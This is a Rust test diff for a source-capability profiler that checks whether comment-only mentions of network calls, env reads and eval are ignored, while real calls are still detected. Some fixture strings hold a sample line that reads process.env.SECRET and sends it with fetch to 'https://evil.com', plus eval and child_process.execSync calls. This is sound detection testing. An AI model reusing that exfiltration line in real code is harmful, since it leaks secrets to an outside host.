@@ -523,3 +523,117 @@ fn generated_profile_module_rejects_capabilities_by_default() {
         .iter()
         .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
 }
+
+#[test]
+fn comment_url_is_not_a_network_host() {
+    // axios's published bundle has `// (e.g. ... 'https://evil.com')` — a URL in a
+    // comment. With a real (variable-argument) network call present, the file is
+    // still flagged for network, but the comment host must NOT become a sink.
+    let mut profiler = SourceProfiler::default();
+    profiler.scan_file(
+        "lib/core/Axios.js",
+        "function send(url) {\n  // example: Object.prototype.baseURL = 'https://evil.com'\n  return fetch(url);\n}\n",
+    );
+    let profile = profiler.finish();
+    assert!(
+        !profile
+            .capabilities
+            .iter()
+            .any(|f| f.target.contains("evil.com")),
+        "URL inside a comment must not be a network host: {:?}",
+        profile.capabilities
+    );
+    // The real fetch is still detected — as the generic `*` host, not the comment.
+    assert!(profile
+        .capabilities
+        .iter()
+        .any(|f| f.kind == CapabilityKind::HttpRequest && f.target == "*"));
+}
+
+#[test]
+fn comment_only_capabilities_are_ignored_js() {
+    // env read, eval, child_process, and a URL appear ONLY inside `//` and
+    // `/* */` comments — none execute, so the file profiles as pure.
+    let mut profiler = SourceProfiler::default();
+    profiler.scan_file(
+        "index.js",
+        "export const VERSION = 1;\n\
+         // const t = process.env.SECRET; fetch('https://evil.com', t);\n\
+         /* eval(payload); require('child_process').execSync('x'); */\n",
+    );
+    let profile = profiler.finish();
+    assert!(
+        profile.capabilities.is_empty(),
+        "capabilities only mentioned in comments must be ignored: {:?}",
+        profile.capabilities
+    );
+}
+
+#[test]
+fn comment_only_capabilities_are_ignored_python_but_real_code_kept() {
+    // A `#` comment mentioning os.environ + a URL is ignored; the real
+    // os.environ read on the next line is still detected.
+    let mut profiler = SourceProfiler::default();
+    profiler.scan_file(
+        "client.py",
+        "import os\n\
+         # token = os.environ['SECRET']  # see https://evil.com\n\
+         real = os.environ['REAL']\n",
+    );
+    let profile = profiler.finish();
+    assert!(
+        !profile.capabilities.iter().any(|f| f.target == "SECRET"),
+        "env name in a comment must be ignored: {:?}",
+        profile.capabilities
+    );
+    assert!(
+        !profile
+            .capabilities
+            .iter()
+            .any(|f| f.target.contains("evil.com")),
+        "URL in a comment must be ignored: {:?}",
+        profile.capabilities
+    );
+    assert!(
+        profile
+            .capabilities
+            .iter()
+            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "REAL"),
+        "the real os.environ['REAL'] read is still detected: {:?}",
+        profile.capabilities
+    );
+}
+
+#[test]
+fn python_floor_division_is_not_a_comment() {
+    // `//` is integer division in Python, NOT a comment — code after it on the
+    // same line must still be scanned (a generic comment-stripper would wrongly
+    // blank the rest of the line and miss the env read).
+    let mut profiler = SourceProfiler::default();
+    profiler.scan_file(
+        "calc.py",
+        "import os\nhalf = total // 2 ; secret = os.environ['REAL']\n",
+    );
+    let profile = profiler.finish();
+    assert!(
+        profile
+            .capabilities
+            .iter()
+            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "REAL"),
+        "`//` must not hide the rest of a Python line: {:?}",
+        profile.capabilities
+    );
+}
+
+#[test]
+fn protocol_slashes_in_a_real_url_are_not_a_comment() {
+    // Regression: the `//` in `https://` lives inside a string literal and must
+    // never be treated as a line comment (which would truncate the host).
+    let mut profiler = SourceProfiler::default();
+    profiler.scan_file("index.js", "fetch('https://api.real.example/v1');\n");
+    let profile = profiler.finish();
+    assert!(profile
+        .capabilities
+        .iter()
+        .any(|f| f.kind == CapabilityKind::HttpRequest && f.target == "api.real.example"));
+}
